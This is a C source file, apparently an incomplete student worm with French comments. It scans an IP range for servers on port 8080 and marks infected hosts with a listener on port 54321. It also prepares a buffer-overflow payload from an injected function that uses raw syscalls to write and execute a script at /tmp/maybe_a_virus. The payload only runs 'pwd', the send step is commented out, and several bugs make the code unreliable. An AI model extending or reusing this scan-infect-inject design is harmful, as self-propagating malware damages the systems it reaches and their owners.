#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define __NR_write 1
#define O_CREAT 00000100
#define O_WRONLY 00000001
#define O_RDWR 00000002
#define O_TRUNC 00001000
#define __NR_open 2
#define __NR_close 3
#define __NR_execve 59

#define SERVER_PORT 8080
#define INFECT_PORT 54321

int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr);

struct cell_server {
    unsigned long IP;
    struct cell_server *Suivant;
};

struct list_server {
    struct cell_server *Debut;
    struct cell_server *Fin;
};

void Init_List(struct list_server * input){ 
	input->Debut = NULL;
	input->Fin = NULL;
}

void Add_Beginning(struct list_server * list, unsigned long address){
	struct cell_server * p_cell;
	p_cell = malloc(sizeof(struct cell_server));
	p_cell->IP = address;

	if (list->Debut == NULL && list->Fin == NULL){
		list->Debut = p_cell;
		list->Fin = p_cell;
		list->Debut->Suivant = NULL;
		list->Fin->Suivant = NULL;

	}
	else{
		struct cell_server * aux = list->Debut;
		list->Debut = p_cell;
		list->Debut->Suivant = aux;
	}
}

void print_list(struct list_server * list){
	struct cell_server * aux = list->Debut;
	while(aux != NULL){
		printf("%022lx ----> ",aux->IP);
		aux= aux->Suivant;
	}
	printf("NULL\n");
}

void free_list (struct list_server * list){
	struct cell_server * aux = list->Debut;
	while(aux != list->Fin){
		aux = aux->Suivant;
		free(list->Debut);
		list->Debut = aux;
	}
}

void code_2_inject(){
	const char hello[] = "#!/bin/bash\npwd\n";
    //int fd = my_open("/tmp/maybe_a_virus", O_CREAT | O_RDWR | O_TRUNC, 00700);
	int fd;
    asm volatile
    (
        "syscall"
        : "=a" (fd)
        : "0" (__NR_open), "D" ("/tmp/maybe_a_virus"), "S" (O_CREAT | O_RDWR | O_TRUNC), "d" (00700)
        : "rcx", "r11", "memory"
    );
    //my_write(fd, hello, sizeof(hello));
	ssize_t ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        //                 EDI      RSI       RDX
        : "0"(__NR_write), "D"(fd), "S"(hello), "d"(sizeof(hello))
        : "rcx", "r11", "memory"
    );
    //my_close(fd);
	int ret_2;
    asm volatile
    (
        "syscall"
        :"=a" (ret_2)
        : "0" (__NR_close), "D" (fd)
        : "rcx", "r11", "memory"
    );
    //my_execve("/tmp/maybe_a_virus",0,0);
	int ret_3;
    asm volatile
    (
        "syscall"
        :"=a" (ret_3)
        : "0" (__NR_execve), "D" ("/tmp/maybe_a_virus"),"S" (0), "d" (0)
        : "rcx", "r11", "memory"
    );
}

void exploit(int connfd){
	
	// Buffer overflow
	char buff[350];
	int buff_size = 49;
	bzero(buff, sizeof(buff));
	char * s = &code_2_inject; // Adresse du code_2_inject stockée
	void (*ptr_func)() = code_2_inject; // déclaration d'un pointeur vers la fonction
	void* addr_func = (void*)ptr_func; // conversion du pointeur vers la fonction en un pointeur de type void*
	printf("L'adresse de la fonction code_2_inject est : %p\n", addr_func);
	int i =0;
	for (; s < &exploit; s++, i++){ // adresse de exploit
        buff[i] = *s;
        printf(" %02x", 0xff& buff[i]);
        if (i % 16 ==0){
            printf("\n");
        }
    }
	printf("\nNombre d'octets = %d\n", i+1);
	//my_write(connfd,)

}


int is_infected(unsigned long ip, int sock, struct sockaddr_in * my_server_addr){
    my_server_addr->sin_addr.s_addr = ip;
    my_server_addr->sin_port = htons(INFECT_PORT);
    int connfd = connect(sock, (struct sockaddr*)&my_server_addr, sizeof(*my_server_addr));
    if (connfd == 0){
		close(connfd);
    	my_server_addr->sin_port = htons(SERVER_PORT);
        return 1;
    }
    else{
	    my_server_addr->sin_port = htons(INFECT_PORT);
        return 0;
    }
}

int infect(){
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    char port[] = "54321";

    if (sockfd < 0) {
		printf("Error in connection.\n");
		exit(1);
	}
	
	struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    addr.sin_addr.s_addr = INADDR_ANY;


    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("bind");
        return 1;
    }
        
    if (listen(sockfd, 5) == -1) {
        perror("listen");
        return 1;
    }

    if(fork() ==0){
        while (1) {
            int client_sock = accept(sockfd, NULL, NULL);
            if (client_sock == -1) {
                perror("accept");
                return 1;
            }
            close(client_sock);
        }
    }
    return 0;
}


struct list_server * scan_server_available(char * start_IP_str, char * end_IP_str){
	int sockfd;
    struct sockaddr_in server_addr;
	unsigned long start_IP, end_IP, start_index, end_index;
	
	// Parse la premiere et derniere machine
	if(inet_pton(AF_INET,start_IP_str,&(start_IP)) != 1){
		printf("Invalid start IP\n");
		exit(-1);
	}
	if(inet_pton(AF_INET,end_IP_str,&(end_IP)) != 1){
		printf("Invalid end IP\n");
		exit(-1);
	};

	// Initialize List struct
	struct list_server * opened_servers;
	opened_servers = malloc(sizeof(struct list_server));
	Init_List(opened_servers);



	start_index= ((start_IP & (0xFF<<24))>>24)&0xFF; 
	end_index= ((end_IP & (0xFF<<24))>>24)&0xFF; 


	if (end_IP < start_IP){
		printf("End IP must be superior to start IP\n");
		exit(-1);
	}

    // Create a TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }

    // Set up the server address struct
    memset(&server_addr, 0, sizeof(server_addr));	
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

	unsigned long aux;

	for(aux = ntohl(start_IP); aux<=ntohl(end_IP); aux++){
		
		
		// Change server's IP	
		server_addr.sin_addr.s_addr = htonl(aux);
		

		//printf("Scanning 0x%02lx . . . \n",aux);
		// Connect to the server
		if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
				continue;
			}
		else {		
			char s_addr_str[INET_ADDRSTRLEN];
			inet_ntop(AF_INET,&(server_addr.sin_addr),s_addr_str, INET_ADDRSTRLEN);
			Add_Beginning(opened_servers,server_addr.sin_addr.s_addr);
			close(sockfd);
		}
	
	}
	printf("Here are the ulong corresponding to opened servers : \n");
	print_list(opened_servers);
	return opened_servers;
}

int entry_point() {

	/* Scan IP given for server listening on port 8080
    then puts them in a linked list*/
	char *start = "127.0.0.1";
	char *end = "127.0.0.255";
    struct list_server *my_list;
	my_list = scan_server_available(start, end);


	// Create and initialize socket 
	int my_sockfd;
	struct sockaddr_in my_server_addr;
	my_sockfd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&my_server_addr, 0, sizeof(my_server_addr));	
    my_server_addr.sin_family = AF_INET;
    my_server_addr.sin_port = htons(SERVER_PORT);


	// Loops through the vulnerable servers 
	struct cell_server * current;
	current = my_list->Debut;
	while(current!= NULL){
		// Checks whether it has previously been infected 
		if (is_infected(current->IP,my_sockfd,&my_server_addr)){
			continue;
		}
		else{
			// Setting up a client connection
			my_server_addr.sin_addr.s_addr = current->IP;
			int connfd;
			infect();
			connfd = connect(my_sockfd, (struct sockaddr*)&my_server_addr, sizeof(my_server_addr));
			if (connfd >= 0){
				// Launch exploit
				exploit(connfd);
			}
		}
		current = current->Suivant;
	}
    return 0;
}



int main(int argc, char * argv[]) {

	// Call entry_point function where every tasks are done
	entry_point();
	//exploit(3);
    return 0;
}
	